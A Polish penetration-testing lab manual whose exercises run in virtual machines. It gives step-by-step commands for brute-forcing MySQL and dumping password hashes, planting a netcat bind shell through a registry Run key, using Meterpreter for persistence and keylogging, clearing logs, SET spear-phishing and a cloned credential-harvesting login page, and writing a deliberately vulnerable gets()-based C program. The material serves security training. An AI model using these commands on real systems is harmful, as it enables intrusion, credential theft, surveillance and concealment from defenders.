Następnym krokiem jaki wykonamy, będzie próba wykrycia konta, które pozwoli nam na zalogowanie się do bazy.
W tym celu skorzystamy z modułu **mysql_login** wraz ze zdefiniowanymi słownikami nazw użytkowników i haseł:

```
> use auxiliary/scanner/mysql/mysql_login
> set RHOSTS <WinServer2012 IP>
> set USER_FILE /root/usernames.lst
> set PASS_FILE /root/passwords.lst
> set THREADS 8
> set STOP_ON_SUCCESS true
> run
```
W wyniku powinniśmy otrzymać login oraz hasło konta na które możemy się zalogować.
Przed połączeniem się z bazą danych wykorzystamy dodatkowe moduły do enumeracji bazy danych oraz zrzutu loginów i haszy haseł z serwera.
```
> use auxiliary/admin/mysql/mysql_enum
> set RHOST <WinServer2012 IP>
> set USERNAME <login>
> set PASSWORD <password>
> run
```
Następnie wykonamy dump haszy haseł z bazy:
```
> use auxiliary/scanner/mysql/mysql_hashdump
> set USERNAME <login>
> set PASSWORD <password>
> set RHOSTS <IP>
> run
```
Teraz możemy połączyć się z bazą:
`# mysql –h <WinServer2012 IP> -u root –p`
W wyniku powinniśmy otrzymać:
`mysql>`
Gdy mamy już dostęp, możemy zobaczyć jakie bazy danych są przechowywane na
serwerze:
`mysql> show databases;`
Za pomocą poleceń `use, show databases, show tables` możemy eksplorować zawartośc serwera baz danych.
Np, możemy przejżeć hasze haseł użytkowników wykonując zapytanie select na bazie mysql:
```
mysql> select User,Password from user;
```
# UTRZYMANIE DOSTĘPU

## Ćwiczenie 1 – Netcat
>**Zasoby:**
Kali Linux , WinServer2012

Jednym ze sposobów by utrzymac dostęp do maszyny ofiary jest intalacja backdoora na hoście. 
Do tego celu posłużymy sie narzędziem **netcat**, dzięki któremu przygotujemy zdalny dostęp do maszyny ofiary:
* Gdy dostaliśmy się już do system, musimy wrzucić netcata na hosta:
```
meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\WINDOWS\\system32
```
* Gdy mamy juz netcata, chcemy aby uruchamiał się on automatycznie. W tym celu musimy dodać wpis do rejestru:

1. `meterpreter > reg enumkey –k HKLM\\software\\microsoft\\windows\\currentversion\\run `
2. `meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v netcat -d 'C:\WINDOWS\system32\nc.exe -ldp 6000 -e cmd.exe'`
3. `meterpreter > reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v netcat`

* Gdy wszystko poszło po naszej myśli, po restarcie maszyny powinniśmy mieć dostęp do niej za pomocą netcata:
`# nc –vn <IP> 6000`

## Ćwiczenie 2 – Backdoor
>**Zasoby:**
Kali Linux , metasploitable2

Skanujemy cel na porcie 21 w poszukiwaniu serwera FTP. W tym celu użyjemy nmap z przełącznikiem `–A` do wykrycia wersji usługi:
`# nmap –A –p21 <metasploitable2 IP>`
Sprawdzimy działanie za pomoca usługi telnet.
`# telnet <metasplotable2 IP> 21`
Po wyświetleniu banneru wpisujemy:
```
user me:)
pass eh...
^] (CTRL+])
quit
```
Backdoor powinien nasłuchiwać na porcie TCP 6200.
Łączymy sie za pomocą telnetu:
`# telnet <metasploitable2 IP> 6200`
W tym momencie możemy wykonywać polecenia jak root.
Należy pamiętac by każde polecenie kończyć znakiem `„;”`

## Ćwiczenie 3 – Metasploit persistence
>**Zasoby:**
Kali Linux , Win7

Do utrzymania dostępu możemy posłużyć się też pakietem metasploit w raz z modułem **persistence**. Moduł ten stworzy tymczasowy plik, server i usługę na naszym hoście-celu.
Posiada on szereg przydatnych funkcji takich jak, połączenie zwrotne w regularnych odstępach czasu , autouruchamianie i inne. By zobaczyć pełną listę opcji wystarczy wykonać:
`meterpreter > run persistence –h`
W celu założenia backdoora uruchamiamy moduł z odpowiadającymi nam parametrami.
`meterpreter > run persistence –A –S –U –p 4321 –r <IP>`
W tym przypadku moduł uruchamiamy następujące paramtery:
`-A` - Automatyczny start pasującego multi/handlera
`-S` - Automatyczny start agenta przy bootowaniu jako usługa
`-U` - Automatyczny start agenta przy logowaniu użytkownika
`-p` - Port
`-r` - IP zdalnego hosta

Jeśli wszystko poszło ok po uruchomieniu systemu powinna zostać nawiązana sesja.

## Ćwiczenie 4 - Keylogger
>**Zasoby:**
Kali Linux , WinServer2012

Aby ułatwić dostęp do systemu można posłużyć się też inną metodą np. przechwycić hasła. Do tego celu możemy wykorzystać metsaploita w raz z jego narzędziem do przechwytywania klawiszy.
Gdy jesteśmy w systemie ofiary możemy przystąpić do podłuchu.
* Na pocztaku nalezy zmigrowac proces meterpretera na proces explorer.exe
`migrate <pid explorer.exe>`

* Po zmigrowaniu mozemy wlaczyc keyloggera:
`meterpreter > keyscan_start`

* Po krótkim czasie możemy podejrzeć wyniki:
`meterpreter > keyscan_dump`

# ZATARCIE ŚLADÓW

## Ćwiczenie 1 - Windows
>**Zasoby:**
Kali Linux , WinServer2012

Do szybkiego usunięcia śladów jakie możemy zostawić w dzienniku zdarzeń możemy posłużyć się narzędziem **clearev** dostępnego z poziomu meterpretera.
Z poziomu systemu Windows Server 2012 zobacz co zostało zarejestrowane w dziennikach do tej pory i porównaj z dziennikami po wykonaniu operacji clearev:
`meterpreter > clearev`

## Ćwiczenie 2 - Linux
>**Zasoby:**
metasploitable

W środowisku linuksowym, logi trzymane są w katalogu `/var/log`. Możemy otworzyć plik i usunąć ślady świadczące o naszej obecności.
Dobrym sposobem jest zmiana wielkości zmiennej `$HISTSIZE` która określa wielkość pliku z historią basha. Możną ją podejrzeć wykonując polecenie
`#echo $HISTSIZE`
Oraz zmienić tę wartość na 0:
`#export HISTSIZE=0`
Od tego momentu nic nie będzie zapisywane do pliku `~/.bash_history.`
Czynność ta najlepiej wykonać od razu po włamaniu po czym przywrócić jej domyślną wartość.

# OMIJANIE SYSTEMÓW IDS ORAZ FIREWALL

## Ćwiczenie 1 - Veil-Framework
>**Zasoby:
Kali Linux, Windows 2012

TO DO

# SET

## Ćwiczenie 1 – Atak phishingowy
>**Zasoby:**
Kali Linux, Windows XP

SET dostarcza nam wiele możliwości ataków. W tym ćwiczeniu przeprowadzimy ukierunkowany atak phishingowy, w którym utworzymy i prześlemy złośliwe pliki za pomocą poczty elektronicznej.
Po otworzeniu pakietu SET przechodzimy kolejno:
```
# setoolkit
1) Social-Engineering Attacks
1) Spear-Phishing Attak Vector
1) Perform a Mass Email Attack
```
Następnym krokiem będzie wybranie ładunku. Pokazowo użyjemy exploita
`14) Adobe util.printf() Buffer Overflow`
Oraz ładunku
`2) Windows Meterpreter Reverse_TCP`
Kolejną czynnością będzie podanie wartości dla `LHOST` i `LPORT`
```
set> IP address for the payload listener (LHOST): 192.168.1.20
set:payloads> Port to connect back on [443]:443
```
SET wygeneruje payload, a następnie zapyta nas czy chcemy sami zdefiniować nazwę załącznika. Wybieramy opcję
`2. Rename the file, I want to be cool.`
I nadajemy chwytliwą nazwę np: nagiefotkiszefowej.pdf
Teraz wybieramy opcję ataku do wielu osób:
`1.E-Mail Attack Single Email Address`
Przygotowując atak możemy stworzyć swój szablon wiadomości lub skorzystać z gotowców. 
My skorzystamy z gotowca np.:
`4: WOAAAA!!!!!!!!!! This is crazy...`
Teraz przychodzi czas na ustawienie celu oraz skąd ma być wysłany e-mail. Możemy skorzystać z konta gogle lub własnego serwera.
:::info
INFO: 
Na poczcie GMAIL zadziała mechanizm analizujący załączniki, więc google zablokuje naszą pocztę.
:::

## Ćwiczenie 2 – Wykorzystanie strony WWW
>**Zasoby:**
Kali Linux, Windows 7

W tym ćwiczeniu wykorzystamy podrobioną przez nas stronę do wykradzenia danych logowania ofiary.
Za pomocą narzędzia SET wybieramy kolejno:
```
#setoolkit
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack Method
```
Teraz musimy wybrać czy chcemy stronę sklonować, skorzystać z szablonu czy też zaimportować własną. 
Dla naszych potrzeb wykonamy klon dowolnej strony.
`2) Site Cloner`
SET poprosi nas o podanie adresu IP który będzie nasłuchiwał ofiary. Wpisujemy adres Kali Linux.
Następnie musimy wpisać adres strony którą sklonujemy np. `http://twitter.com`
W tym momencie SET uruchomi serwer www ze sklonowaną stroną.   Teraz należy tylko podesłać link ofierze i czekać aż się zaloguje.

Z poziomu Windows wejdź pod adres Kali Linux i spróbuj się zalogować na sklonowaną stronę.

# BUFFER OVERFLOW I FUZZING

## Ćwiczenie 1 - Buffer overflow – linux
>**Zasoby:**
metasploitable

Aby zaprezentować problem przepełnienia bufora, napiszemy krótki program, który będzie podatny na ten typ ataku.
Zalogujmy się do systemu metasploitable. W katalogu domowym stwórzmy nowy katalog *buffer_overflow*
`mkdir buffer_overflow`
W naszym katalogu utwórzmy plik *buffer.c*, który będzie zawierał następującą treść:
```clike=
#include <stdio.h>
main(){
    char *dane;
    char *polecenie;
    dane = (char *) malloc(12);
    polecenie = (char *) malloc(64);
    
    strcpy(polecenie, „echo wartość poprawna”);
    
    printf(„wprowadz dane :”);
    gets(dane);
    
    system(polecenie);
}
```
Skompilujmy program:
`gcc buffer.c –o buffer`
Mogą pojawić się ostrzeżenia, ale kod skompiluje się.
Uruchamiamy program:
`./buffer`

Twoim zadaniem jest wykonanie "ręcznego" fuzzingu i ustalenie wartości gdzie buffor zostanie przepełniony i będziesz mógł wykonać dowolny kod.
